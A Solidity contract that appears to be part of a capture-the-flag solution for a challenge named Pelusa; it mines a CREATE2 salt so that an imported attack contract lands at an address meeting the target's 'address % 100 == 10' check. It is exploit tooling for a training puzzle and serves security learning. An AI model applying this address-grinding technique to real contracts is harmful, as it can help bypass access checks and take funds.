// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import {Create2} from "openzeppelin-contracts/utils/Create2.sol";
import {PelusaAttack} from "./PelusaAttack.sol";

contract PelusaAttackDeployer {

    function deploy(address _owner, address _target) external returns (address) {
        bytes memory initCode = getBytecode(_owner,_target);
        bytes32 slot = getAddress(keccak256(initCode));

        if(slot != bytes32(0)) {
            return Create2.deploy(0,slot,initCode);
        } else {
            return address(0);
        }
    }

    function getBytecode(address _owner, address _target) public pure returns (bytes memory) {
        bytes memory bytecode = type(PelusaAttack).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_owner, _target));
    }

    function getAddress(bytes32 initCode) internal view returns (bytes32) {
        for(uint32 i=1;i<512;i++) {
           address deployAddress = Create2.computeAddress(bytes32(uint256(i)),initCode);

           bool condition = uint256(uint160(deployAddress)) % 100 == 10;
           if(condition) {
               return bytes32(uint256(i));
           }
        }
        return bytes32(0);
    }
}